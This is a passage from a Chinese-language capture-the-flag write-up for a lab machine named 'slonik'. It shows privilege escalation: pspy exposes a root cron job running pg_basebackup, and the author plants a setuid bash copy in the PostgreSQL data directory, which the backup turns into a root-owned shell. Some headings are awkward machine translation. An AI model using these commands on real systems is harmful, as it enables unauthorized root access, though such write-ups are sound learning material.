id_ed25519  id_ed25519.pub  known_hosts  known_hosts.old  pspy64
[~/.ssh][★]$ scp -i id_ed25519 pspy64 postgres@10.129.234.160:/dev/shm/
```
#### 会将其设置为可执行状态并运行它：
```
[~/.ssh][★]$ ssh -i id_ed25519 postgres@10.129.234.160
postgres@slonik:~$ cd /dev/shm
postgres@slonik:/dev/shm$ ls
PostgreSQL.2952396296  pspy64
postgres@slonik:/dev/shm$ chmod +x pspy64
postgres@slonik:/dev/shm$ ./pspy64
2026/03/11 08:49:03 CMD: UID=0    PID=17985  | /usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/ 
2026/03/11 08:49:03 CMD: UID=0    PID=17982  | /bin/bash /usr/bin/backup 
2026/03/11 08:49:03 CMD: UID=0    PID=17981  | /bin/sh -c /usr/bin/backup 
2026/03/11 08:49:03 CMD: UID=0    PID=17980  | /usr/sbin/CRON -f -P 
2026/03/11 08:49:03 CMD: UID=115  PID=17970  | ./pspy64 
2026/03/11 08:49:03 CMD: UID=0    PID=17949  | /snap/amazon-ssm-agent/7628/amazon-ssm-agent 
</SNIP>
```
#### 每分钟都会有由 cron 启动的一系列操作：
#### 密码监控程序揭示了一个有趣的情况：在 /usr/bin/backup 目录下有一个备份脚本，它每隔几分钟就会以 root 身份运行一次。
#### 看起来 cron 会运行 /bin/bash /usr/bin/backup 这个命令。从生成的进程来看，我能大致理解这个脚本的内容，但直接查看文件会更简单些：
```
postgres@slonik:/usr/bin$ cat backup
#!/bin/bash

date=$(/usr/bin/date +"%FT%H%M")
/usr/bin/rm -rf /opt/backups/current/*
/usr/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/
/usr/bin/zip -r "/var/backups/archive-$date.zip" /opt/backups/current/

count=$(/usr/bin/find "/var/backups/" -maxdepth 1 -type f -o -type d | /usr/bin/wc -l)
if [ "$count" -gt 10 ]; then
  /usr/bin/rm -rf /var/backups/*
fi
```
#### 它会删除 /opt/backups/current 目录下的所有文件，然后使用该目录作为输出目录来调用标准的 PostgreSQL 工具 pg_basebackup。
#### 接着，它会将该目录压缩成一个名为当前日期的文件，并存放在 /var/backups 目录下。之后，它会统计备份的数量，如果数量大于 10，则全部删除（对于备份策略来说，这有点过于激进了！）
#### Poison Backup
#### pg_basebackup 的文档将其描述为：
#### pg_basebackup 用于对正在运行的 PostgreSQL 数据库集群进行基础备份。
```
postgres@slonik:/usr/bin$ cat pg_basebackup
```
#### 正在备份到 /opt/backups/current 目录下的文件是位于 /var/lib/postgresql/14/main 目录中的那些文件：
```
2026/03/11 08:54:03 CMD: UID=0    PID=18607  | /usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/
```
#### /usr/lib/postgresql/14/bin/pg_basebackup → PostgreSQL 的备份工具；到本地 用户postgres；-D /opt/backups/current/ → 备份数据保存路径
```
postgres@slonik:~/14/main$ ls
PG_VERSION    pg_logical    pg_snapshots  pg_twophase		postmaster.pid
base	      pg_multixact  pg_stat	  pg_wal
global	      pg_notify     pg_stat_tmp   pg_xact
pg_commit_ts  pg_replslot   pg_subtrans   postgresql.auto.conf
pg_dynshmem   pg_serial     pg_tblspc	  postmaster.opts
```
#### 存在一些差异：
```
postgres@slonik:~/14/main$ diff <(ls -1) <(ls /opt/backups/current/ -1)
1a2,3
> backup_label
> backup_manifest
20,21d21
< postmaster.opts
< postmaster.pid
```
#### 该备份会生成两个关于备份的文件，但不会复制两个“postmaster”文件。而且，所复制的文件的所有者是“root”用户。
#### 将把 bash 复制到该目录中（因为这是 postgres 用户的主目录，而且它能够在此处写入文件），并将其设置为“设置用户 ID / 设置组 ID”模式：
```
postgres@slonik:~/14/main$ find /bin/bash
/bin/bash 
postgres@slonik:~/14/main$ ls -lh /bin/bash
-rwxr-xr-x 1 root root 1.4M Mar 14  2024 /bin/bash
```
#### 可以在任何地方通过绝对路径 /bin/bash 调用
```
postgres@slonik:~/14/main$ cp /bin/bash .

postgres@slonik:~/14/main$ chmod 6777 bash

postgres@slonik:~/14/main$ ls -la bash
-rwsrwsrwx 1 postgres postgres 1396520 Mar 11 09:17 bash

ostgres@slonik:/opt/backups/current$ ls -l bash
-rwsrwsrwx 1 root root 1396520 Mar 11 09:24 bash
```
#### Oxdf会使用“-p”参数来避免权限丢失：
```
postgres@slonik:/opt/backups/current$  ./bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
```
### 总结 
#### 位于 /var/backups 目录下的新备份文件每分钟都会生成一次，并且其路径是从 /opt/backups/current 开始的
#### /opt/backups/current 目录下的文件是位于 /var/lib/postgresql/14/main 目录中的那些文件

#### (pspy:/bin/bash) /var/backups   --> /opt/backups/current(没有root用户，postmaster）  <-- /var/lib/postgresql/14/main （有root用户，backup_label）
